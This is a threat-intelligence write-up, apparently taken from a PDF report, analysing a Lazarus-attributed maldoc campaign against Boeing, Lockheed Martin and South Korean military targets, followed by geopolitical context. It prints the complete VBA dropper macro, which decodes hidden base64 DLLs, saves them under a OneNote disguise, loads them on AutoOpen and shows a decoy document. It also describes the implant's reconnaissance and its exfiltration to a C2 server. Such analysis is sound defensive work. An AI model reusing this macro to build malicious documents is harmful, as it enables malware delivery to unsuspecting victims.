Malware analysis
The initial vector is a maldoc using a template injection for download and execute the next stager.
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1"

</Relationships>

The second stager use a document with a macro. The first block define the alias functions for the rest of the script.
Private Declare PtrSafe Function CoContentInfo Lib "onenote.db" (ByVal lpDocPath As String, ByVal
lpPass As String, ByVal lpUID As String) As Long
Private Declare PtrSafe Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As
LongPtr

The next three functions give the abilities to create a new folder, check the existence of a file and folder.
Function MkDir(szDir)
On Error Resume Next
MkDir = CreateObject("Scripting.FileSystemObject").CreateFolder(szDir)
End Function
Function FileExist(szFile)
On Error Resume Next
FileExist = CreateObject("Scripting.FileSystemObject").FileExists(szFile)
End Function
Function FolderExist(szFolder)
On Error Resume Next
FolderExist = CreateObject("Scripting.FileSystemObject").FolderExists(szFolder)
End Function

The following block of functions allows to decode the stream in base 64, that used on the next declared functions.
Function Stream_BinaryToString(Binary)
On Error Resume Next
Const adTypeText = 2
Const adTypeBinary = 1
Dim BinaryStream 'As New Stream
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeBinary
BinaryStream.Open
BinaryStream.Write Binary
BinaryStream.Position = 0
BinaryStream.Type = adTypeText
BinaryStream.Charset = "us-ascii"
Stream_BinaryToString = BinaryStream.ReadText
Set BinaryStream = Nothing
End Function
Function Base64DecodeToBinary(ByVal vCode)
On Error Resume Next
Dim oXML, oNode
Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
Set oNode = oXML.CreateElement("base64")
oNode.dataType = "bin.base64"
oNode.Text = vCode
Base64DecodeToBinary = oNode.nodeTypedValue
Set oNode = Nothing
Set oXML = Nothing
End Function
Function Base64DecodeToString(ByVal vCode)
On Error Resume Next
Dim oXML, oNode
Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
Set oNode = oXML.CreateElement("base64")
oNode.dataType = "bin.base64"
oNode.Text = vCode
Base64DecodeToString = Stream_BinaryToString(oNode.nodeTypedValue)
Set oNode = Nothing
Set oXML = Nothing
End Function

This block of function extracts the dll in function of the architecture (X86 or X64), the lure document for the victim all on the
path pushed in argument.

2/21

Sub ExtractDll(dllPath)
On Error Resume Next
Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 1
objStream.Open
#If Win64 Then
objStream.Write Base64DecodeToBinary(Base64DecodeToString(UserForm1.Label1.Caption))
#Else
objStream.Write Base64DecodeToBinary(Base64DecodeToString(UserForm1.Label2.Caption))
#End If
objStream.SaveToFile dllPath, 2
Set objStream = Nothing
End Sub
Sub ExtractDoc(docPath)
On Error Resume Next
Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 1
objStream.Open
objStream.Write Base64DecodeToBinary(Base64DecodeToString(UserForm1.Label3.Caption))
objStream.SaveToFile docPath, 2
Set objStream = Nothing
End Sub

We can note that the functions used for the name generation give a name based on the current path of the dotm file but like
a dll, this check if the files already exist and rename it, this avoids to throw errors on the victim. We can also see that the
same part of a common path used for store the dll continue to be used on their operation (\AppData\Local\Microsoft\).
Function GetDocName() As String
On Error Resume Next
curDocNameFull = ActiveDocument.Path & "\" & ActiveDocument.Name
curDocName = Left(curDocNameFull, InStrRev(curDocNameFull, ".") - 1)
newDocNameFull = curDocName & " .doc"
Do While FileExist(newDocNameFull)
curDocName = curDocName & " "
newDocNameFull = curDocName & " .docx"
Loop
GetDocName = newDocNameFull
End Function
Function GetDllName() As String
On Error Resume Next
Dim dllPath As String
workDir = Environ("UserProfile") & "\AppData\Local\Microsoft\OneNote"
If Not FolderExist(workDir) Then
MkDir (workDir)
End If
dllPath = workDir & "\onenote.db"
nIdx = 0
Do While FileExist(dllPath)
workDir = workDir & "\Modules"
If Not FolderExist(workDir) Then
MkDir (workDir)
End If
dllPath = workDir & "\onenote.db"
Loop
GetDllName = dllPath
End Function

The final part is the autoopen method for execute the macro at the beginning of the document, extract the lure and the dll,
give their names and execute dll in passing the lure document in argument for show it to the victim.

3/21

Sub AutoOpen()
On Error Resume Next
Application.Visible = False
dllPath = GetDllName()
docPath = GetDocName()
orgDocPath = ActiveDocument.Path & "\" & ActiveDocument.Name
ExtractDll (dllPath)
ExtractDoc (docPath)
LoadLibraryA (dllPath)
a = CoContentInfo(orgDocPath, "S-6-38-4412-76700627-315277-3247", "18")
Dim objDocApp
Set objDocApp = CreateObject("Word.Application")
objDocApp.Visible = True
objDocApp.Documents.Open docPath
Application.Quit (wdDoNotSaveChanges)
End Sub

On the command of the persistence, we can note the key and the increment used for AES, this increment is also used as
ID victim where each ID is attributed to a target.

Liking supposed on the argument for launch the dll, this used the dll sqlite3 for parsing the SQLite databases and extract
the informations. Each version released of the sqlite3.dll content a tracker for getting, the time of the build and the hash
relative at this build (here on the X86 version).

The launch of the dll is ensured by the creation of a new thread and a rundll32 call.

The implant pushes the persistence in using the startup folder created by the dotm file. The Lazarus group continue to use
the name of the products of Microsoft company as lure for the victim as lnk file.

The malware in more parse the SQLite database, use the function sqlite3_win32_is_nt of the dll sqlite3 for getting the
OS version of the victim.

Once this did, this executes the main function for getting the system informations.

For getting the process running on the computer, the malware use the common method CreateToolhelp32Snapshot for
create a snapshot of all the process and parse for have the modules and informations.

Like for the process, this use the common methods by API ( GetLogicalDrives , GetDriveTypeW ,
GetDiskFreeSpaceExW ) for getting the informations on the disks and volumes present on the computer (Logical, space
...).

10/21

After regrouping all the data. This push the header with the common header for Mozilla in finding it by the method
ObtainUserAgentString (this gives the header in searching with a predefined profile, here Mozilla).

11/21

Once this done, send the data by a POST request to the C2.

For all the samples, this is the same TTPs used by the Lazarus group. On compare the date of creation, modification,
template and the users, we can note that all grouped for one common operation.

On the structure of the media on the maldocs, we can note that all the images and references are doubled maybe by wrong
coding the builder.

Threat intelligence
Boeing
The choice of the attack of the airbus is logical by the actualities on the Boeing group. With the COVID-19 event, the
business with the possible customers become more harder, that an additional problem when we had the problem with the
Boeing 737 MAX banned from flying following numerous crashes. The direction of the group has announced the possible
massive cuts of jobs in the company. The group was to make the setting of priorities with these military and civil appliances
and the communication of the economic result of the first quarter of the year 2020. On these tensions, it is obvious that the
parts of the Human resources were knowingly targeted by pretending a possible job or communication for the staff.

We can hypothesize about the target groups:
Research center in the Republic of Korea (Boeing Military)
Boeing Defense, Space & Security

Lockheed Martin
As said earlier, South Korea negotiated the support contract for its F-35 fleet, Lockheed Martin had selected BAE Systems
for build engineering and training facilities at Royal Air Force in Norfolk.

15/21

In view of the phishing campaign on the landing armies in South Korea, North Korea is interested in another event on the
presentation at Future Armored Vehicles Weapon Systems 2020.

16/21

The maldoc for Lockheed Martin use a reedited cover of the annual report 2019 of BAE and Lockheed Martin.

17/21

Korean Army
April 2020 have been a full month in events on the ROK, despite the reduction in costs with events related to COVID-19 in
the military events, the south korean airforce have planned to upgrade the actual F-16 and F-35 fleet for theirs operational
support and equipment. An event for joint drill operation with the US air force was previously planned have been canceled
due to the COVID-19 restriction.

18/21

This event has been used to become familiar with the recently arrived RQ-4 drones from South Korea. This improvement
precedes the firing of short-range missiles a few days before the start of discussions about the elections in South Korea.

This event with also impacted the modification of the measures to protect tanks of the South Korean army, information that
is interested in North Korea in the light of recent phishing campaigns in the land forces.

Likewise, recent changes have taken place in the South Korean Navy with the change of chief of naval operations to the
hands with the new minesweeper ship and upgrade of Destroyers for the adapt the response of the threats to South Korea
(Korea south, China ...). So many changes that attract the lusts of North Korea to learn more from the measures taken by

19/21

South Korea. However, it can't be excluded that other countries are very interested in these famous measures such as
China, which borders with North Korea and in these economic zones with South Korea.
